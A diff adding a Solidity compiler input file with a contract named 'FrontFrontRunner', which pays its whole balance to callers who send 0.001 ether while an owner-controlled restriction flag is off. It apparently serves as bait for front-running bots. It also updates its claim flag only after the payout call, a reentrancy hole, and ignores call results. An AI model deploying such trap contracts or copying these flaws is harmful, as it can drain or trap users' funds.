@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "FrontFrontRunner.sol": {
+      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity >=0.7.0 <0.9.0;\n\ncontract FrontFrontRunner {\n    address owner;\n    bool isRestricted;\n    bool hasBeenClaimed;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    receive() external payable {}\n    \n    function send() external payable {}\n\n    function withdraw() payable public {\n        if (msg.value == 0.001 ether) {\n            if ((!isRestricted) || (msg.sender == owner)) {\n                msg.sender.call{value: address(this).balance}(\"\");\n            }\n        }\n    }\n    \n    function claimAndWithdraw() payable public {\n        if (msg.value == 0.001 ether) {\n            if ((!hasBeenClaimed) || (msg.sender == owner)) {\n                msg.sender.call{value: address(this).balance}(\"\");\n                hasBeenClaimed = true;\n            }\n        }\n    }\n\n    function restrictToOwner() public {\n        require (msg.sender == owner);\n        \n        isRestricted = true;\n    }\n    \n    function unrestrictToOwner() public {\n        require (msg.sender == owner);\n        \n        isRestricted = false;\n    }\n    \n    function ownerWithdraw() public {\n        require (msg.sender == owner);\n        \n        msg.sender.call{value: address(this).balance}(\"\");\n    }\n\n    function resetClaim() public {\n        require (msg.sender == owner);\n        \n        hasBeenClaimed = false;\n    }\n    \n}"
+    }
+  }
+}
